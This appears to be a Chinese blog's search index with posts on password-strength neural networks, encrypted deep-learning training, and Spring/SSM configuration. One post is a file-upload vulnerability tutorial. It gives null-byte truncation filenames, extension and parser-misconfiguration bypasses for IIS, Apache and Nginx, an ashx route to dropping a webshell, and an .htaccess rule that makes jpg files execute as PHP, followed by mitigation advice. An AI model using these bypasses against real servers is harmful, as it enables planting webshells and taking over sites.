<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[用神经网络来实时检测密码强度]]></title>
    <url>%2F2019%2F08%2F29%2F%E7%94%A8%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E6%9D%A5%E5%AE%9E%E6%97%B6%E6%A3%80%E6%B5%8B%E5%AF%86%E7%A0%81%E5%BC%BA%E5%BA%A6%2F</url>
    <content type="text"><![CDATA[论文地址：https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/melicher 概览 论文中作者用神经网络设计了一个密码强度评估的系统。该系统分为服务端和客户端两部分，服务端采用规模比较大的神经网络，客户端采用规模比较小的神经网络，因为服务端的系统性能好，而且在客户端要使普通用户能够实时(反馈延时小于100ms)得到密码强度信息的反馈。经过作者的对比，神经网络的速度要快于目前最先进的几种算法：概率模型、马尔可夫模型、字母表搜索方式。最重要的是神经网络所占用的空间相比于其他方式特别小。 内部结构 神经网络的结构如下图所示： 这个系统有点类似于马尔可夫链，通过输入前面的字符，用来预测后一个字符的概率，其中这个网络中还有一个特殊的字符用来表示字符串的结束。最开始是以空白的输入开始的，也就是全部输入0，然后通过后续字符的概率来计算输出一个特定字符串的概率。 首先一个密码的强度可以通过需要猜解的次数体现出来，而且文中给出了一个计算猜解次数的方式，通过对一个测试集合的概率做统计，然后通过使用Monte Carlo simulation来画出尝试次数和概率的曲线，这是一个统计学方面的知识，具体还没了解过，类似于下面图片的东西： 所以可以根据这种方式来进行各种模型的性能对比，对比下来神经网络模型尤其在密码字符长而且更复杂(也就是采用字符数字大小写)的情况下性能更好，就是在相同尝试次数的情况下猜测出来的概率更高。 对于客户端的神经网络模型，作者对一系列参数进行了优化，优化的方面有权重的数字压缩、定点编码、Zigzag编码、Lossless压缩、存储常用密码。从而使得客户端的模型容量更小而且运行速度更快。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
        <tag>密码学</tag>
        <tag>神经网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中心化深度学习训练]]></title>
    <url>%2F2019%2F08%2F29%2F%E4%B8%AD%E5%BF%83%E5%8C%96%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AE%AD%E7%BB%83%2F</url>
    <content type="text"><![CDATA[论文地址：https://www.ijcai.org/proceedings/2018/547 论文提出的方法能够充分利用服务器的计算性能高的优点，最重要的是能够保证训练数据：也就是用户的隐私数据的保密性。 文章提出的方法是基于同态加密的，一般的同态加密算法的性质有加法同态和乘法同态，下面是这两者的性质： 加法同态：E(X+Y)=E(X)+E(Y)E(X+Y)=E(X)+E(Y)E(X+Y)=E(X)+E(Y)或者X+Y=D(E(X)+E(Y))X+Y=D(E(X)+E(Y))X+Y=D(E(X)+E(Y)) 乘法同态：E(X∗Y)=E(X)E(Y)E(X*Y)=E(X)E(Y)E(X∗Y)=E(X)E(Y)或者XY=D(E(X)E(Y))XY=D(E(X)E(Y))XY=D(E(X)E(Y)) 文章的大致思路是用户有自己的隐私数据想用来建立模型，但不想让服务器知道，用户可以使用一个叫做Paillier的加密算法来加密自己的数据，而这个算法是分公私钥的，用户拥有密钥对（PKc，SKc），通过公钥加密数据，用私钥解密数据，而公钥也同时公布给服务器，服务器在执行反向传播算法的时候会用到公钥。算法中假设所有的用户都共享这一对密钥，但是用户之间都是守信的，不会向服务器泄露自己的私钥，并且不会传输对抗性样本。 因为深度神经网络DNN在计算过程中只有激活层会使用非线性函数，而其他层均是线性网络，并且也是运算量最大的部分，因此可以放到服务器上运算，而每一层的激活层则回传给用户计算。具体的计算步骤如下图所示 在这里面，服务器运算时候的w和b都添加了噪声，目的是使得服务器无法从a和z的值推算出具体的激活函数，这也保证了数据的机密性。 ​ 而反向传播算法也是基于DNN的反向传播算法进行的，这里由用户来计算更新参数的差值，服务器来实现更新值。这里提到了服务器的训练参数不能被用户知道，所以和单个用户交流计算的次数最大不能超过m+2，这里m指的是各层中最多的参数个数，因为用户知道学习率η和每轮变化值，通过m+2个方程可以推算出m个参数的值 这篇文章不知道可以应用在哪里，因为这里的前提条件比较苛刻，需要各个用户之间相互信任，而且不存在泄密者，在现实下不知道能不能找到应用场景。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传的简单介绍]]></title>
    <url>%2F2019%2F08%2F29%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[文件上传 首先我们通过一个网站上传一个非法格式的文件 1.在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。 2.如果网页未弹窗，而在页面弹窗，则考虑后端验证 空字节的理解 字符串以%00（空字节）作为结束符 文件上传的基本流程 1.图片是否正常上传 2.图片上传的内容是否被感染（内容替换） 3.上传的域名是否是目标服务器 4.如果域名不是目标服务器，那就判断解析图片的服务器是否解析（PHP,ASP,ASPX,JSP,CFM,SHRML）等 5.上传的目录是否支持解析上述格式 JS验证 JS验证时前端验证绕过的一种。 对于那些在客户端网页上增加JS来验证的网站，只需要在console上写改成想要的逻辑，就能往服务器发送恶意的PHP文件。 截断上传 由于服务器端PHP存在空字节漏洞，例如ereg()函数就存在空字节漏洞，如果通过抓包软件将发送到服务器的上传文件的包截获，并将文件名字改成a.jpg%00.php，在服务器端时通过以下语句来判断是否是jpg的： ereg('jpg$',urldecode($file['name'])); 该文件名经过该函数会判断成功，实际上空字节将jpg的后缀阶段了，从而上传的时一个php文件。 黑名单上传验证 绕过黑名单上传验证的几种方法： 1.将文件的后缀名大小写互换 2.如果只解释PHP可以尝试将文件后缀改为php3,php4,php5,phtml 二次上传漏洞的简要分析 二次上传 解析漏洞 IIS解析漏洞 使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。 目录解析(6.0) 形式：www.xxx.com/xx.asp/xx.jpg原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。 文件解析 形式：www.xxx.com/xx.asp;.jpg原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。 解析文件类型 IIS6.0 默认的可执行文件除了asp还包含这三种 : /test.asa,/test.cer,/test.cdx IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。 例如 a.aspx.a;.a.aspx.jpg..jpg Apache解析漏洞 原理：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如test.php.owf.rar其中owf和rar 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。 形式：www.xxxx.xxx.com/test.php.php123 其余配置问题导致的漏洞： （1）如果在 Apache 的 conf 里有这样一行配置AddHandler php5-script .php 这时只要文件名里包含php， 即使文件名是 test2.php.jpg 也会以 php 来执行。 （2）如果在 Apache 的 conf 里有这样一行配置AddType application/x-httpd-php .jpg即使扩展名是 jpg，一样能以 php 方式执行。 Nginx解析漏洞 原理：Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为phpinfo.jpg/1.php，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了。 形式： www.xxxx.com/UploadFiles/image/1.jpg/1.php www.xxxx.com/UploadFiles/image/1.jpg/.php ashx上传 如果服务器过滤了asa,cer,cdx,htr,aspx,php,jsp等脚本，如果想要突破服务器，可以使用ashx脚本，用ashx来写一个asp的一句话到当前目录。 保存为ashx，然后调价一个ashx的上传类型，上传成功后访问 http://www.xxx.com/admin/eWebEditor/UploadFile/2010821235545.ashx 就会在当前目录生成一伙人root.asp的木马，用lake2的一句话链接就能见到hello world!了。因为网站再过滤常见脚本的时候把ashx给漏了… .htaccess上传 再网站的目录下新建一个名为.htaccess的文件，并在文件中添加代码： 1234&lt;Files *.jpg&gt;ForceType application/x-httpd-phpSetHandler application/x-httpd-php&lt;/Files&gt; 这样网页再访问当前目录下的文件的时候，所有的jpg文件都会被解析为php 修补文件上传漏洞的一些建议 1.文件上传的目录设置为不可执行 2.结合使用MIME Type来判断文件的类型 3.使用随机数改写文件名和文件路径 4.单独设置文件服务器的域名]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSM中各个配置文件的成分和作用概览]]></title>
    <url>%2F2019%2F08%2F09%2FSSM%E4%B8%AD%E5%90%84%E4%B8%AA%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E6%88%90%E5%88%86%E5%92%8C%E4%BD%9C%E7%94%A8%E6%A6%82%E8%A7%88%2F</url>
    <content type="text"><![CDATA[SSM整合 写配置 web.xml 1234567891011121314151617181920212223242526272829303132333435&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:web="http://java.sun.com/xml/ns/javaee" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd" version="2.5"&gt; &lt;!-- spring的配置文件--&gt; &lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;!--指定spring文件配置路径--&gt; &lt;param-value&gt;classpath:applicationContext.xml&lt;/param-value&gt; &lt;/context-param&gt; &lt;!--ContextLoaderListener监听器的作用就是启动Web容器时，自动装配ApplicationContext的配置信息--&gt; &lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;!-- spring mvc核心：分发servlet --&gt; &lt;servlet&gt; &lt;servlet-name&gt;mvc-dispatcher&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;!-- spring mvc的配置文件 --&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:springMVC.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;mvc-dispatcher&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;!--两个标准配置，字符编码和支持rest风格的过滤器--&gt;&lt;/web-app&gt; Spring的配置 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:aop="http://www.springframework.org/schema/aop" xmlns:tx="http://www.springframework.org/schema/tx" xmlns:jdbc="http://www.springframework.org/schema/jdbc" xmlns:context="http://www.springframework.org/schema/context" xmlns:mvc="http://www.springframework.org/schema/mvc" xsi:schemaLocation=" http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-3.0.xsd http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd http://www.springframework.org/schema/jdbc http://www.springframework.org/schema/jdbc/spring-jdbc-3.0.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-3.0.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-3.0.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd"&gt; &lt;!--一般是除去控制器不扫，其他都扫，因为这个项目比较简单是个模板，因此service就够了--&gt; &lt;context:annotation-config /&gt; &lt;context:component-scan base-package="com.how2java.service" /&gt; &lt;!--配置数据源--&gt; &lt;bean id="dataSource" class="org.springframework.jdbc.datasource.DriverManagerDataSource"&gt; &lt;property name="driverClassName"&gt; &lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt; &lt;/property&gt; &lt;property name="url"&gt; &lt;value&gt;jdbc:mysql://localhost:3306/how2java?characterEncoding=UTF-8&lt;/value&gt; &lt;/property&gt; &lt;property name="username"&gt; &lt;value&gt;root&lt;/value&gt; &lt;/property&gt; &lt;property name="password"&gt; &lt;value&gt;admin&lt;/value&gt; &lt;/property&gt; &lt;/bean&gt; &lt;!--可以根据配置文件得到sqlSessionFactory--&gt; &lt;bean id="sqlSession" class="org.mybatis.spring.SqlSessionFactoryBean"&gt; &lt;!--指定配置文件的位置--&gt; &lt;property name="configLocation" value="classpath:mybatis/mybatis-config.xml"/&gt; &lt;!--设置这个以后再Mapper配置文件中在parameterType 的值就不用写成全路径名了--&gt; &lt;property name="typeAliasesPackage" value="com.how2java.pojo" /&gt; &lt;property name="dataSource" ref="dataSource"/&gt; &lt;!--指定xml映射文件的位置,就相当于以前单mybatis配置时的mapper标签--&gt; &lt;property name="mapperLocations" value="classpath:com/how2java/mapper/*.xml"/&gt; &lt;!--有些设置其实可以在mybatis-config.xml中配置，如果去掉了这个文件就在这里配置--&gt; &lt;/bean&gt; &lt;!--我们要把每一个dao接口的实现加入到ioc容器中--&gt; &lt;bean class="org.mybatis.spring.mapper.MapperScannerConfigurer"&gt; &lt;!--指定dao接口所在的包，把接口的实现加入到了ioc容器中--&gt; &lt;property name="basePackage" value="com.how2java.mapper"/&gt; &lt;/bean&gt; &lt;!--配置事务控制；配置事务管理器，让他控制住数据源里面的连接的关闭和提交--&gt; &lt;bean id="tm" class="org.springframework.jdbc.datasource.DataSourceTransactionManager"&gt; &lt;property name="dataSource" ref="dataSource"&gt;&lt;/property&gt; &lt;/bean&gt; &lt;!--基于xml配置事务；哪些方法切入事务还要写切入点表达式--&gt; &lt;aop:config&gt; &lt;!--配置切入点表达式,代表任意返回值的任意类的任意方法和任意传入参数--&gt; &lt;aop:pointcut expression="execution(* org.how2java.service.*.*(..))" id="txpoint"/&gt; &lt;aop:advisor advice-ref="myTx" pointcut-ref="txpoint"&gt;&lt;/aop:advisor&gt; &lt;/aop:config&gt; &lt;!--配置事务增强，事务建议，事务属性 transaction-manager="tm":指定要配置的事务管理器id--&gt; &lt;tx:advice id="myTx" transaction-manager="tm"&gt; &lt;!--配置事务属性--&gt; &lt;tx:attributes&gt; &lt;tx:method name="*" rollback-for="java.lang.Exception"&gt;&lt;/tx:method&gt; &lt;tx:method name="insertEmp" isolation="READ_UNCOMMITTED"&gt;&lt;/tx:method&gt; &lt;/tx:attributes&gt; &lt;/tx:advice&gt; &lt;/beans&gt; SpringMVC的配置 123456789101112131415161718192021222324252627282930313233343536&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:aop="http://www.springframework.org/schema/aop" xmlns:tx="http://www.springframework.org/schema/tx" xmlns:jdbc="http://www.springframework.org/schema/jdbc" xmlns:context="http://www.springframework.org/schema/context" xmlns:mvc="http://www.springframework.org/schema/mvc" xsi:schemaLocation="http://www.springframework.org/schema/jdbc http://www.springframework.org/schema/jdbc/spring-jdbc-3.0.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-3.0.xsd http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-3.0.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-3.0.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc-3.2.xsd"&gt; &lt;context:annotation-config/&gt; &lt;!--SpringMVC只扫描controller--&gt; &lt;context:component-scan base-package="com.how2java.controller"&gt; &lt;context:include-filter type="annotation" expression="org.springframework.stereotype.Controller"/&gt; &lt;/context:component-scan&gt; &lt;!--扫动态资源--&gt; &lt;mvc:annotation-driven /&gt; &lt;!--扫静态资源--&gt; &lt;mvc:default-servlet-handler /&gt; &lt;!-- 视图解析器 --&gt; &lt;bean class="org.springframework.web.servlet.view.InternalResourceViewResolver"&gt; &lt;property name="viewClass" value="org.springframework.web.servlet.view.JstlView" /&gt; &lt;property name="prefix" value="/WEB-INF/jsp/" /&gt; &lt;property name="suffix" value=".jsp" /&gt; &lt;/bean&gt; &lt;!--配置文件上传解析器--&gt;&lt;/beans&gt; Mybatis的配置 1234567891011&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE configurationPUBLIC "-//mybatis.org//DTD Config 3.0//EN""http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;&lt;configuration&gt; &lt;!-- 打开延迟加载的开关 --&gt; &lt;setting name="lazyLoadingEnabled" value="true" /&gt; &lt;!-- 将积极加载改为消息加载即按需加载 --&gt; &lt;setting name="aggressiveLazyLoading" value="false"/&gt; &lt;setting name="cacheEnabled" value="true"/&gt;&lt;/configuration&gt; 其他的配置 123456789101112131415161718192021222324&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt; &lt;mapper namespace="com.how2java.mapper.CategoryMapper"&gt; &lt;insert id="add" parameterType="Category" &gt; insert into category_ ( name ) values (#&#123;name&#125;) &lt;/insert&gt; &lt;delete id="delete" parameterType="Category" &gt; delete from category_ where id= #&#123;id&#125; &lt;/delete&gt; &lt;select id="get" parameterType="_int" resultType="Category"&gt; select * from category_ where id= #&#123;id&#125; &lt;/select&gt; &lt;update id="update" parameterType="Category" &gt; update category_ set name=#&#123;name&#125; where id=#&#123;id&#125; &lt;/update&gt; &lt;select id="list" resultType="Category"&gt; select * from category_ &lt;/select&gt; &lt;/mapper&gt; 整合步骤 导入整合包 能够将dao的实现加入到容器中]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>SSM框架</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringMVC的基本使用]]></title>
    <url>%2F2019%2F08%2F06%2FSpringMVC%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Spring来实现Web模块，从而简化Web开发，下面时MVC的结构： POJO:Plain Old Java Object 在Spring眼中的MVC是如下结构的： 配置结构 SpringMVC的思想是有一个前端控制器能拦截所有请求，并智能派发，这个前端控制器是一个Servlet，应该在web.xml中配置这个servlet来拦截所有请求 其中url-pattern最好使用/，因为/*的拦截范围更大，还会拦截到.jsp页面，一旦拦截页面就没办法显示了 同时写一个controller类，来处理请求 因为返回的值太长了，我们可以配置一个视图解析器，那么我们返回的只要是文件名就可以了 HelloWorld细节 运行流程 1.客户会点击链接发送请求http://localhost:8080/springmvc/hello 2.来到Tomcat服务器 3.SpringMVC的前端控制器收到所有请求 4.来看请求地址和@RequestMapping标注的哪个匹配，来找到到底使用哪个类的哪个方法来处理 5.前端控制器找到了目标处理器和目标方法，直接利用返回执行目标方法 6.方法执行完成以后会有一个返回值SpringMVC就认为这个返回值就是要去的页面地址 7.拿到方法返回值以后，用视图解析器拼串得到完整的页面地址 8.拿到页面地址，前端控制器帮我们转发到页面 @RequestMapping 就是告诉SpringMVC这个方法用来处理什么请求，括号里的斜杠是可以省略的，即使省略了也是从当前项目下开始 使用上还是比较复杂的，后续再详细说明 标在类上，说明是表示该类是映射到某个路径上的，而标在方法上就是直接拦截该地址，而且调用该方法处理请求 其他属性 ： method:限定请求方式（GET.POST） params: headers:规定请求同意必须包含什么内容 consumes;只接受内容类型是哪种请求，规定请求头中的Content-Type produces:告诉浏览器返回的内容类型是什么，给响应头中加上Content-Type url-pattern的规则 1.服务器中的大web中有一个DefaultServlet是url-pattern=/ DefaultServlet是Tomcat中处理静态资源的 ，出去jsp和servlet外剩下的都是静态资源 index.html是静态资源，Tomcat就会在服务器下找到这个资源并返回 2.我们配置中前端控制器url-pattern=/ 相当于我们前端控制器的/禁用了Tomcat服务器中的DefaultServlet 静态资源会来到DispatcherServlet(前端控制器)看哪个方法的RequestMapping是这个index.html 3.为什么jsp又能访问呢，因为我们没有覆盖服务器中的JspServlet 4./*是直接拦截所有请求，而且我们写/也是为了迎合后来的Rest风格的URL地址 @PathVariable REST风格 系统希望以非常简洁的URL地址来发请求，怎么表示对一个资源的增删改查，用请求方式来区分 以前的增删改查： /getBook?id=1:查询图书 /deleteBook?id=1:删除一号图书 /deleteBook?id=1:更新一号图书 /addBook:添加图书 但是问题是在页面上只能发起GET和POST两种请求，其他请求方式没法使用 因此@RequestMapping中的方法有四个，所以服务器端界首市不成问题的，但是如何让页面发起另外两个请求这是个问题 Spring提供了对REST风格的支持： 1.SpringMVC中有一个Filter,他可以把普通的请求转化为规定的请求，配置这个filter 2.如何发起其他形式请求：可以按照以下形式，1.创建一个POST表单 2.表单携带一个_method的参数 3.这个参数就是delete,put SpringMVC如何获取请求带来的各种信息 @RequestParam:获取请求参数 直接给方法入参上写一个和请求名字相同的变量，这个变量就来接受请求参数的值 @RequestHandle: 如果请求头中没有指定的参数就会报错 @CookieValue:获取某个Cookie,以前的获取cookie是获取所有的cookie，并通过遍历寻找特定的值 例子：@CookieValue(“JSESSIONID”)String jid SpringMVC的自动封装-POJO 可以新建一个POJO下的类，这个类里面比如说定义了一个Book对象，并在里面定义了该对象所有参数的get和set方法。假如在前端浏览器发送过来一系列该Book的参数，则不需要一个个接受，直接传递一个Book对象就能进行自动接收 如果我们的请求参数是一个自定义类型（POJO），SpringMVC会自动的为这个POJO进行赋值 1.将POJO的每一个参数，从request参数中尝试获取出来，并封装即可 2.还可以级联封装，也就是属性的属性 假设address是book对象里的一个属性，可以在前端下面这样传递值 SpringMVC获取原生API 出现乱码 数据输出 如何将数据带回给页面，除去在方法上传入原生的request和session外还能怎么样把数据带给页面 1.可以在方法处传入Map或者Model或者ModelMap，给这些参数里面保存的所有数据都会放在域中，可以在页面获取 这个参数会被放在请求域中，在JSP中通过${requestScope.msg}获取 同样Model也会被放在request中 以上三种方式都会被放在请求域中，因为三者的类都是一样的，都是BindingAwareModelMap在工作,相当于放在这个类中的东西都会被放在请求域当中 2.方法的返回值可以变为ModelAndView类型，既包含视图信息（页面地址），也包含模型数据（给页面带的数据），而且数据也是放在请求域中的 ​ 如果想把返回参数放在其他域中，就可以使用@SessionAttributes把数据放到HttpSession里 SpringMVC源码 前端控制器架构 视图解析 视图解析在前面进行处理的时候会在前后加上前后缀，因此在处理请求的时候要跳转到其他页面的时候，需要使用其他的方式，其中第一种方式是使用相对路径，另一种方式是使用forward，如下所示： forward的转发不会有我们的视图解析器拼串 SpringMVC的运行流程 1.对于所有的请求，前端控制器（DispatcherServlet）收到请求，调用doDispatch进行处理 2.根据HandlerMapping中保存的请求映射信息找到，处理当前请求的，处理器执行链（包含拦截器） 3.根据当前的处理器找到他的HandlerAdapter(适配器) 4.拦截器的preHandle限制性 5.适配器执行目标方法，并返回ModelAndView ​ 1）ModelAttribute注解标注方法提前运行 ​ 2）执行目标方法的时候（确定目标方法用的参数） ​ 1）有注解 ​ 2）没注解 ​ 1）看是否有Model,Map或者其他的 ​ 2）如果是自定义类型 ​ 1）从隐含模型看看有没有，有就从里面拿 ​ 2）如果没有，再看是否是SessionAttribute标注的属性，如果是就从Session中拿，拿不到就 ​ 会抛异常 ​ 3）都不是就利用反射创建对象 6.拦截器的postHandle执行 7.处理结果（页面渲染流程） ​ 1）如果有异常就是用异常解析器处理异常，处理完后还会返回ModelAndView ​ 2）调用render进行页面渲染 ​ 1）视图解析器根据视图名得到视图对象 ​ 2）视图对象调用render方法 ​ 3）执行拦截器的afterCompletion Spring和SpringMVC的整合 可以在Spring中配置扫描除了controller外的其他路径，在Springmvc上配置值扫描controller上的路径，因为默认系统会将Spring作为父容器，SpringMVC会作为子容器，因此子容器可以取到父容器中的对象，但是相反却不行]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>SSM框架</tag>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring的基本使用]]></title>
    <url>%2F2019%2F08%2F04%2FSpring%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Spring 容器框架，可以管理所有的组件 核心关注IOC和AOP Test:Spring的单元测试模块 Core Container:核心容器（IOC）；黑色代表这部分的功能由那些jar包组成； AOP+Aspects（面向切面模块） 数据访问/集成：oxm(xml),tx(事务） Web:Spring开发Web应用的模块 IOC（控制反转） 控制：资源的获取方式 主动式：自己创建所需要的资源 12345BookServlet&#123;BookService bs = new BookService(); //复杂对象的创建时比较庞大的功能&#125; 被动式：资源的获取交给容器来创建 1234567891011BookServlet&#123; BookService bs; public void test1()&#123; bs.checkout; &#125;&#125; 容器：管理所有的组件（有功能的类） DI（依赖注入） 容器知道哪个组件运行的时候需要另外一个类；容器通过反射的形式，将准备好的对象注入到需要的地方。 主要是容器管理的组件，都能够使用容器提供的功能。 构造体注入和setter注入 setter注入 1.ApplicationContext(IOC容器的接口） 2.给容器注册一个组件，我们也从容器中根据id拿到了这个组件的对象，首先组件的创建工作是容器完成的。 对象的创建工作是在容器启动的时候就已经创建好了 3.默认对象是单例创建的，并且在容器启动时随之创建 4.容器中如果没有传入ID的Bean，就会报异常 5.IOC容器在创建这个组件对象时会通过setter方法为属性赋值（property标签） 6.javaBean的属性名是由getter.setter方法的名字决定的 通过类型获取实体 1234&lt;bean id="person" class="com.ss.Person"&gt; &lt;property name="Lastname" value="zgha"&gt;&lt;/property&gt; &lt;property name="age" value="18"&gt;&lt;/property&gt;&lt;/bean&gt; 12ApplicationContext ioc = new CLassPathXmlApplicationContext('ioc.xml');ioc.getBean(Person.class); 能够成功返回实体类型 如果xml中注入的两个相同类型的实体类型，那么按类型查找就会报错 调用构造器进行注入 1234&lt;bean id="person1" class="com.ss.Person"&gt; &lt;constructor-arg name="Lastname" value="zhd"&gt;&lt;/constructor-arg&gt; &lt;constructor-arg name="age" value="18"&gt;&lt;/constructor-arg&gt;&lt;/bean&gt; 通过p名称空间对bean属性赋值 名称空间是用来防止标签重复的，比如 12&lt;c:forEach&gt;&lt;jsp:forword&gt; 要用p名称空闲首先需要导入，就是在xml文件最前面对一个名称空间的引用 123&lt;bean id="person" class="com.ss.Person"&gt; p:name="asd" p:age="18"&lt;/bean&gt; 为各种属性赋值 1234567891011&lt;bean id="car" class="com.ss.Car"&gt; &lt;property name="carName" value="bmw"&gt;&lt;/property&gt; &lt;property name="color" value="green"&gt;&lt;/property&gt; &lt;property name="price" value="30000"&gt;&lt;/property&gt;&lt;/bean&gt;&lt;bean id="person1" class="com.ss.Person"&gt; &lt;property name="Lastname" value="zgha"&gt;&lt;/property&gt; &lt;property name="age" value="18"&gt;&lt;/property&gt; &lt;property name="car" ref=car&gt;&lt;/property&gt; &lt;!--也可以在使用bean标签重新创建对象--&gt;&lt;/bean&gt; 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;bean id="person2" class="com.ss.Person"&gt; &lt;property name="books"&gt; &lt;list&gt; &lt;!--在list标签中添加每一个对象--&gt; &lt;bean id="book1" class="com.ss.Book" p:bookName="搜索"/&gt; &lt;!--引用外部一个元素--&gt; &lt;ref bean="book01"/&gt; &lt;/list&gt; &lt;/property&gt; &lt;!--Map&lt;String, Object&gt; maps;--&gt; &lt;property&gt; &lt;!--maps = new LinkedHashMap&lt;&gt;();--&gt; &lt;map&gt; &lt;!--一个entry就代表一个键值对--&gt; &lt;entry key="key01" value="zhang"&gt;&lt;/entry&gt; &lt;entry key="key02" value="18"&gt;&lt;/entry&gt; &lt;entry key="key03" value-ref="book01"&gt;&lt;/entry&gt; &lt;entry key="key04"&gt; &lt;bean class="com.ss.Car"&gt; &lt;property name="CarName" value="BMW"&gt;&lt;/property&gt; &lt;/bean&gt; &lt;/entry&gt; &lt;/map&gt; &lt;/property&gt;&lt;/bean&gt;&lt;!--Util名称空间创建集合类型的bean;方便别人引用--&gt;&lt;bean class="com.ss.Person"&gt; &lt;property name="maps" ref="myMap"&gt;&lt;/property&gt;&lt;/bean&gt;&lt;util:map id="myMap"&gt; &lt;!--添加元素--&gt; &lt;entry key="key01" value="zhang"&gt;&lt;/entry&gt; &lt;entry key="key02" value="18"&gt;&lt;/entry&gt; &lt;entry key="key03" value-ref="book01"&gt;&lt;/entry&gt; &lt;entry key="key04"&gt; &lt;bean class="com.ss.Car"&gt; &lt;property name="CarName" value="BMW"&gt;&lt;/property&gt; &lt;/bean&gt; &lt;/entry&gt;&lt;/util:map&gt; 在xml中用parent来继承另外一个实体的属性值，其中要变的就在下面赋值，其余的就使用和父类一样的值 有一个标签时abstract=true，那么这个实体只能被用于继承，而不能获取实例 Bean的作用域 指定Bean是否时单例，默认情况下创建的时单例，scope标签可以指定Bean的作用域 1&lt;bean id="book" class="com.ss.Book" scope="prototype"&gt;&lt;/bean&gt; prototype:多实例的 1.容器启动默认不会去创建多实例Bean 2.获取的时候创建多实例Bean 3.每次获取都会创建新的对象 singleton:单实例的 